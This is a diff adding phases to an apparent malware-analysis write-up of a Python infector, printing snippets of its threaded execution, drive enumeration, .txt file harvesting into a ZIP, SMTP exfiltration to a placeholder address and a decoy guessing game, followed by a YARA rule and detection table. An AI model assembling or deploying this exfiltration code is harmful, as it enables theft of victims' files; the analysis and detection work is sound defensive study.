@@ -76,6 +76,102 @@ if not infected:
 
 ---
 
-### Phase 4: Execution & Host Code Masking
+### Phase 4: Multi-Threaded Execution Architecture
+```
+# Concurrently launch infection, exfiltration, and decoy routines
+T1 = threading.Thread(target=infection)
+T1.start()
+T2 = threading.Thread(target=malicious_code)
+T2.start()
+T3 = threading.Thread(target=mask)
+T3.start()
+```
+- Parallel Execution: Uses Python's threading library to execute infection(), malicious_code(), and mask() simultaneously across three separate threads.
+- Stealth & Evasion: Running the propagation and exfiltration logic in background threads (T1 and T2) prevents the process from blocking, allowing the user-facing decoy thread (T3) to run without noticeable latency.
 
-To be continued
+### Phase 5: Drive Enumeration, Staging & Exfiltration (malicious_code())
+```
+# Query active Windows drive letters via low-level Bitmask
+drives = []
+bitmask = windll.kernel32.GetLogicalDrives()
+
+for letter in string.ascii_uppercase:
+    if bitmask & 1:
+        drives.append(letter)
+    bitmask >>= 1
+```
+- Drive Mapping: Uses ctypes to call GetLogicalDrives() from Windows kernel32.dll, using bitwise right-shift operations (>>= 1) to enumerate all mounted drives (e.g., C:\, D:\).
+
+```
+# Recursive directory traversal for file harvesting
+for C in drives:
+    src_dir = C + ":\\"
+    for dirpath, dirnames, filenames in os.walk(src_dir):
+        for x in filenames:
+            if x.endswith(".txt"):
+                # Copy targeted text files into staging folder (\tempvirus)
+                file_path = os.path.join(dirpath, x)
+                shutil.copy(file_path, dst_dir)
+
+# Package staging folder into a ZIP archive
+fileToSend = shutil.make_archive(access, 'zip', access)
+```
+
+- File System Traversal: os.walk() recursively scans all discovered directories to isolate files matching targeted extensions (.txt).
+- Data Staging: Copies targeted files into a newly created staging directory (\tempvirus) and compresses the folder into a .zip archive using shutil.make_archive().
+
+```
+# Exfiltrate archive via SMTP protocol
+smtp = smtplib.SMTP(Server, port)
+smtp.login(UserName, Password)
+smtp.sendmail(UserName, "email@example.com", msg.as_string())
+smtp.close()
+```
+
+- Configuration Ingestion: Reads SMTP server credentials, port numbers, and authentication details from a local mail.txt file.
+- Payload Transmission: Formats the ZIP archive into a Base64-encoded MIME attachment and transmits the data to a remote address over standard SMTP using smtplib.
+
+### Phase 6: Decoy Application & Process Termination (mask())
+```
+# Interactive CLI game to distract the user
+guess = int(input("Guess a number:- "))
+
+# Abrupt process termination upon completion
+current_system_pid = os.getpid()
+ThisSystem = psutil.Process(current_system_pid)
+ThisSystem.terminate()
+```
+
+- Social Engineering Mask: Runs an interactive number-guessing game in the foreground to keep the user engaged while background threads complete execution.
+- Forced Termination: Retrieves the current process ID (os.getpid()) and invokes psutil.Process().terminate() to kill the entire Python process, immediately ending any active background activity once the decoy game concludes.
+
+### Phase 7: Comprehensive Defensive Engineering & Detection
+- Sample Detection Rule (YARA)
+```
+rule Detect_Python_MultiThreaded_Infector {
+    meta:
+        description = "Detects prepending Python infector with threading and exfiltration mechanics"
+        author = "Security Analysis Lab"
+        severity = "High"
+    strings:
+        $start_marker = "### THE VIRUS STARTS HERE ###"
+        $end_marker   = "### THE VIRUS ENDS HERE ###"
+        $self_read    = "sys.argv[0]"
+        $drive_enum   = "GetLogicalDrives"
+        $smtp         = "smtplib.SMTP"
+    condition:
+        all of ($start_marker, $end_marker,$self_read) or
+        ($drive_enum and$smtp)
+}
+```
+
+- Detection Matrix
+
+| Attack Vector | Identified Behavior | Defensive Control / Mitigation |
+| :--- | :--- | :--- |
+| **Self-Inspection** | Reading `sys.argv[0]` to extract source code | **Heuristic Analysis:** Flag scripts attempting self-reading file handles combined with directory iteration. |
+| **Prepending Injection** | Overwriting `.py` files with prepended payload | **File Integrity Monitoring (FIM):** Track SHA-256 hash changes across system and project dependencies. |
+| **Multi-Threading** | Spawning parallel background execution threads | **Process Monitoring:** Alert on CLI scripts initiating background worker threads prior to user input. |
+| **Drive Traversal** | Calling `GetLogicalDrives()` & broad `os.walk()` scans | **EDR Behavioral Rules:** Detect rapid, high-volume file read operations across local and mapped drives. |
+| **Exfiltration** | Transmitting ZIP archives via SMTP | **DLP & Firewall:** Enforce egress filtering on SMTP ports (25, 465, 587) and monitor outbound MIME attachments. |
+| **Static Markers** | Delimiter comments embedded in scripts | **YARA Signatures:** Match known string markers (`### THE VIRUS... ###`) during static file scans. |
